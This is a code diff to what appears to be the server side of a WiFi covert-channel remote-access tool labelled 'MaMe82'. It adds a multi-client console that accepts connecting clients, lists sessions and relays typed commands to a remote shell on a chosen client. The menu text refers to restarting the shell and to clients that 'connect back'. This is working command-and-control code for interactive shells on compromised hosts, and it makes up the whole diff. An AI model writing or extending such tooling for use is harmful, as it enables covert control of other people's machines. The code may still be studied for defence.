@@ -873,6 +873,8 @@ class ServerSocket:
 		
 	
 	def accept(self):
+		# type: () -> ClientSocket
+		
 		# ask connection queue for the first connection in Connection.STATE_PENDING_ACCEPT
 		# if there's no connection, passive wait for a state change
 		# repeat till there's a connection in state Connection.STATE_PENDING_ACCEPT and return it
@@ -910,12 +912,15 @@ class ClientShell(cmd.Cmd):
 	def do_test(self, line):
 		# print(line)
 		interact = True
+		
 		while interact:
 			try:
 				if select([sys.stdin], [], [], 0.05)[0]: # 50 ms timeout, to keep CPU load low
 					input = sys.stdin.readline() # replace readline by accumulation of input chars til carriage return
+					#input = input.replace('\n', '\r\n')
 					input = input.replace('\n', '\r\n')
-					print(input)
+					
+					#print(input)
 					self.csock.send(input)
 		
 			except KeyboardInterrupt:
@@ -924,27 +929,156 @@ class ClientShell(cmd.Cmd):
 			while self.csock.hasInData():
 				inchunk = self.csock.read(self.csock.mtu)
 				if len(inchunk) > 0:
-					print("inchunk: {0}".format(inchunk))
+					#print("inchunk: {0}".format(inchunk))
+					sys.stdout.write(inchunk)
 				else:
 					logging.debug("Empty packet")
 	
+
+class Server(cmd.Cmd):
+	def __init__(self,  srvID=9,  max_clients=3):
+		self.serv_socket = ServerSocket()
+		self.serv_socket.bind(srvID)
+		self.serv_socket.listen(max_clients)
+		self.client_socks = []
+		
+		self.server_sock_thread = Thread(target = self.__connection_handler, name = "Server connection handler thread", args = ())
+		self.server_sock_thread.start()
+		
+		self.prompt = "MaMe82 WiFi covert channel > "
+		cmd.Cmd.__init__(self)
+		
+	def __connection_handler(self):
+		try:
+			while True:
+				con = self.serv_socket.accept()
+				logging.debug("Accepted new client ID: {0}".format(con.clientID))
+				self.client_socks.append(con)
+				#con.print_out()
+				
+		finally:
+			# ToDo: disconnect all client sockets
+			self.serv_socket.unbind()	
+
+	def __check_for_clientID(self,  clientID):
+		for c in self.client_socks:
+			if c.clientID == clientID:
+				return True
+		return False
+	
+	def __get_client_sock_by_ID(self,  clientID):
+		for c in self.client_socks:
+			if c.clientID == clientID:
+				return c
+		return None	
+	
+	def __interact(self,  clientID):
+		# grab clientSocket
+		cs = self.__get_client_sock_by_ID(clientID)
+		if cs ==  None:
+			print("No session for clientID {0} found".format(clientID))
+			return
+		
+		interact = True
+	
+		while interact:
+			try:
+				if select([sys.stdin], [], [], 0.05)[0]: # 50 ms timeout, to keep CPU load low
+					input = sys.stdin.readline() # replace readline by accumulation of input chars til carriage return
+					#input = input.replace('\n', '\r\n')
+					input = input.replace('\n', '\r\n')
+	
+					#print(input)
+					cs.send(input)
+			except KeyboardInterrupt:
+				#print("\nInteraction stopped by keyboard interrupt.\nTo continue interaction use 'interact'.")
+				print("\nInteraction with clientID {0} paused.\nWhat do you want to do ?")
+				print("\t1: Background the session")
+				print("\t2: Clear in- and outqueue (long output pending)")
+				print("\t3: Restart the shell (not responsive)")
+				print("\t4: Restart the client (restart shell doesn't help)")
+				print("\t5: Exit the client (Warning: client won't connect back again)")
+				print("\t0: Continue interaction")
+				
+				
+				
+				hasChosen = False
+				options = [0, 1, 2, 3, 4, 5]
+				while not hasChosen:
+					given = raw_input("Choose option: ")
+					try:
+						selection = int(given)
+					except ValueError:
+						print("Invalid option")
+						continue
+					
+					if selection in options:
+						break
+					else:
+						print("Invalid option")
+						
+				if selection == 0:
+					# do nothing
+					pass
+				elif selection == 1:
+					interact = False
+				else:
+					# ToDo
+					print("Option not implemented")
+					
+					
+			while cs.hasInData():
+				inchunk = cs.read(cs.mtu)
+				if len(inchunk) > 0:
+					#print("inchunk: {0}".format(inchunk))
+					sys.stdout.write(inchunk)
+				else:
+					logging.debug("Empty packet")
+					
+
+	def emptyline(self):
+		pass # don't repeat last line
+	
+	def do_sessions(self, line):
+		for csock in self.client_socks:
+			print("{0}: Session clientID {0}, clientIV {1}".format(csock.clientID,  csock.clientIV))
+			
+	def do_interact(self,  line):
+		inval_id = "You have to provide a valid client ID (see 'sessions' command)"
+		try:
+			clientID = int(line)
+		except ValueError:
+			print(inval_id)
+			return
+			
+		if not self.__check_for_clientID(clientID):
+			print(inval_id)
+			return
+		self.__interact(clientID)
+		
 	
 ##### MAIN CODE #####
-SERVER_ID = 9
-serv_socket = ServerSocket()
-serv_socket.bind(SERVER_ID)
-serv_socket.listen(7)
-try:
-	while True:
-		con = serv_socket.accept()
-		logging.debug("accepted connection:")
-		con.print_out()
-		shell = ClientShell(con)
-		shell.cmdloop()
+srv = Server(srvID=9, max_clients=3)
+srv.cmdloop(intro=None)
+
+					
+#SERVER_ID = 9
+#serv_socket = ServerSocket()
+#serv_socket.bind(SERVER_ID)
+#serv_socket.listen(7)
+
+
+#try:
+	#while True:
+		#con = serv_socket.accept()
+		#logging.debug("accepted connection:")
+		#con.print_out()
+		#shell = ClientShell(con)
+		#shell.cmdloop()
 		
-		# we directly interact with the first connection, till a connection handler is implemented
-		#time.sleep(1)
-finally:
-	serv_socket.unbind()	
+		## we directly interact with the first connection, till a connection handler is implemented
+		##time.sleep(1)
+#finally:
+	#serv_socket.unbind()	
 	
 	
